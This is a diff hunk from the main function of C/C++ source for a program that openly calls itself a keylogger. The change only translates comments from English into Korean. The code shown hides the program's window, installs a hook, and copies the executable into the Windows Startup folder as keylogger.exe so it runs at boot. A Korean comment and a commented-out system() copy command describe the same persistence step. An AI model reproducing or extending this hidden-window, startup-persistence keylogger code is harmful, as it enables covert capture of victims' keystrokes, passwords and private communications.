@@ -231,14 +231,15 @@ void Stealth()
  int main()
 {
 	//int ok = 0;
-	// visibility of window
+	// visibility of window 
+	// 가시성
 	Stealth();
 
 	// Set the hook
 	SetHook();
 	
 	CopyFile("untitled1.exe", "C:\\users\\default\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\startup\\keylogger.exe", TRUE);
-	//When execute this program in administrator mode, it excutes when computer starts up.
+	// 관리자 모드에서이 프로그램을 실행하면 컴퓨터가 시작될 때 실행됩니다.
 	MSG msg;
 	//system("copy Untitled1.exe C:\\Users\\default\\AppData\\Roaming\\Microsoft\\Windows\\");
 	 
